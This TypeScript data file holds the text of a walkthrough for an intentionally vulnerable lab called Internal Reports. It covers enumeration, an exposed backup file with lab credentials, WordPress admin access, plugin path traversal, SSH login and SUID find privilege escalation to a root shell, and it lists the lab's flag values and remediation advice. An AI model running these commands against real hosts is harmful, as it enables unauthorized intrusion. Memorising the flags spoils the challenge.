// ─────────────────────────────────────────────────────────────
//  INTERNAL REPORTS WRITEUP — edit this file to update the text,
//  flags, and the "View PoC" panel. Nothing else needs to change.
// ─────────────────────────────────────────────────────────────

export type Block =
  | { type: "h3"; text: string }
  | { type: "p"; text: string }
  | { type: "list"; items: string[] }
  | { type: "code"; lang?: string; code: string };

export type Section = {
  number: string;
  title: string;
  blocks: Block[];
};

export const sections: Section[] = [
  {
    number: "01",
    title: "Overview",
    blocks: [
      { type: "p", text: "Internal Reports is a Linux and web application security lab demonstrating how several weaknesses can be chained together to gain privileged access." },
      { type: "p", text: "The attack path covers:" },
      {
        type: "list",
        items: [
          "Web server enumeration",
          "Discovery of an exposed backup file",
          "Credential discovery",
          "WordPress administrator access",
          "Path traversal in a custom WordPress plugin",
          "SSH access",
          "Linux privilege escalation through a misconfigured SUID binary",
        ],
      },
    ],
  },
  {
    number: "02",
    title: "Enumeration",
    blocks: [
      { type: "p", text: "Begin by identifying the target's reachable services and exposed web application resources." },
      { type: "code", lang: "bash", code: "nmap -sC -sV -p- <TARGET_IP>" },
      { type: "p", text: "Inspect the HTTP service and identify the WordPress installation. Enumerate accessible paths and resources:" },
      { type: "code", lang: "bash", code: "whatweb http://<TARGET_IP>" },
      { type: "code", lang: "bash", code: "dirsearch -u http://<TARGET_IP>" },
      { type: "p", text: "Enumeration should identify the web application, exposed directories, potentially sensitive backup files, and useful application endpoints." },
    ],
  },
  {
    number: "03",
    title: "Discovering the Exposed Backup File",
    blocks: [
      { type: "p", text: "The lab contains an exposed backup file at:" },
      { type: "code", lang: "text", code: "/wp-content/uploads/old-admin.txt" },
      { type: "p", text: "Sensitive backup files should never be stored in publicly accessible web directories." },
      { type: "p", text: "Inspect the file:" },
      { type: "code", lang: "bash", code: "curl http://<TARGET_IP>/wp-content/uploads/old-admin.txt" },
      { type: "p", text: "The lab file contains the following credentials:" },
      { type: "code", lang: "text", code: "Username: reportadmin\nPassword: ReportAdmin2026!" },
      { type: "p", text: "These credentials are provided as part of this intentionally vulnerable lab. In a real assessment, exposed credentials should be handled responsibly and reported securely." },
    ],
  },
  {
    number: "04",
    title: "WordPress Administrator Access",
    blocks: [
      { type: "p", text: "Navigate to the WordPress login page:" },
      { type: "code", lang: "text", code: "http://<TARGET_IP>/wp-login.php" },
      { type: "p", text: "Authenticate using the credentials obtained from the exposed backup file." },
      { type: "p", text: "After logging in, inspect the installed plugins and investigate the custom Report Reader plugin." },
      { type: "p", text: "Plugin review can reveal insecure file handling, weak input validation, and other application security flaws." },
    ],
  },
  {
    number: "05",
    title: "Exploiting Path Traversal",
    blocks: [
      { type: "p", text: "The Report Reader plugin implements a shortcode:" },
      { type: "code", lang: "text", code: '[include_report path="..."]' },
      { type: "p", text: "The lab's vulnerable implementation allows a user-controlled file path to escape the intended report directory. Path traversal occurs when an application fails to properly constrain file access to an intended directory." },
      { type: "p", text: "The objective in this lab is to read:" },
      { type: "code", lang: "text", code: "/var/www/secure/ssh.txt" },
      {
        type: "p",
        text: "UNVERIFIED — the exact working shortcode input used against the Report Reader plugin has not yet been confirmed against the live lab. Replace this note with the real payload once it has been tested and verified.",
      },
      { type: "p", text: "Impact: sensitive files outside the intended report directory may become accessible through the vulnerable file inclusion functionality." },
    ],
  },
  {
    number: "06",
    title: "Recovering SSH Credentials",
    blocks: [
      { type: "p", text: "The file /var/www/secure/ssh.txt contains the credentials for the lab's SSH account." },
      {
        type: "p",
        text: "UNVERIFIED — the exact contents of ssh.txt have not yet been confirmed by reading the file through the path traversal vulnerability. Replace this note with the verified credentials once the file has been successfully read.",
      },
    ],
  },
  {
    number: "07",
    title: "SSH Access",
    blocks: [
      { type: "p", text: "Connect to the SSH service using the recovered lab credentials:" },
      { type: "code", lang: "bash", code: "ssh -p 2222 Manuel@<TARGET_IP>" },
      { type: "p", text: "The port is 2222 in the supplied local Docker setup. If the published room uses a different port, use the actual target configuration instead." },
      { type: "p", text: "After successful authentication, enumerate the account, available commands, file permissions, and possible privilege escalation paths." },
    ],
  },
  {
    number: "08",
    title: "Linux Privilege Escalation",
    blocks: [
      { type: "p", text: "Check for SUID binaries:" },
      { type: "code", lang: "bash", code: "find / -type f -perm -4000 2>/dev/null" },
      { type: "p", text: "The lab is designed around a misconfigured SUID find binary." },
      { type: "p", text: "If the binary's SUID permissions and execution behavior are verified, the intended privilege escalation is demonstrated using the following command from a suitable writable working directory:" },
      { type: "code", lang: "bash", code: "find . -exec /bin/sh -p \\; -quit" },
      { type: "p", text: "The -p option requests preservation of the effective privileges in the shell. The escalation succeeds only if the binary is genuinely SUID-root and the environment permits the expected behavior." },
      { type: "p", text: "Verify the resulting identity:" },
      { type: "code", lang: "bash", code: "id" },
      { type: "code", lang: "bash", code: "whoami" },
      { type: "p", text: "Security impact: unnecessary SUID permissions on privileged binaries must be removed, binaries should be audited regularly, and least-privilege principles should be followed." },
    ],
  },
];

export const lessonsLearned = {
  chain: [
    "Enumeration identified the WordPress application and exposed resources.",
    "An accessible backup file disclosed administrator credentials.",
    "WordPress access enabled investigation of the custom plugin.",
    "Path traversal exposed sensitive SSH credentials.",
    "SSH provided access to the Linux host.",
    "A misconfigured SUID binary enabled privilege escalation.",
  ],
  remediation: [
    "Remove sensitive backups from public directories.",
    "Rotate exposed credentials.",
    "Restrict file inclusion to a canonical, approved directory.",
    "Validate file paths on the server side.",
    "Apply least-privilege permissions.",
    "Audit and remove unnecessary SUID binaries.",
    "Monitor suspicious file access and privilege escalation attempts.",
  ],
};

// Set `verified: true` and fill in `value` once each flag is confirmed against the live lab.
export const flags: { label: string; verified: boolean; value: string }[] = [
  { label: "User Flag", verified: true, value: "THM{Manuel084578hhut353535}" },
  { label: "Root Flag", verified: true, value: "THM{05856ughib39gwf08f3v}" },
];

// Each PoC step only appears once `verified: true`. Fill in `output` with the
// real captured terminal output — do not invent output that wasn't observed.
export const pocSteps: { title: string; command: string; verified: boolean; output: string }[] = [
  {
    title: "Exposed backup file request",
    command: "curl http://<TARGET_IP>/wp-content/uploads/old-admin.txt",
    verified: false,
    output: "",
  },
  {
    title: "Path traversal input",
    command: '[include_report path="..."]',
    verified: false,
    output: "",
  },
  {
    title: "SSH connection",
    command: "ssh -p 2222 Manuel@<TARGET_IP>",
    verified: false,
    output: "",
  },
  {
    title: "SUID privilege escalation",
    command: "find . -exec /bin/sh -p \\; -quit",
    verified: false,
    output: "",
  },
  {
    title: "Verification of root access",
    command: "id && whoami",
    verified: false,
    output: "",
  },
];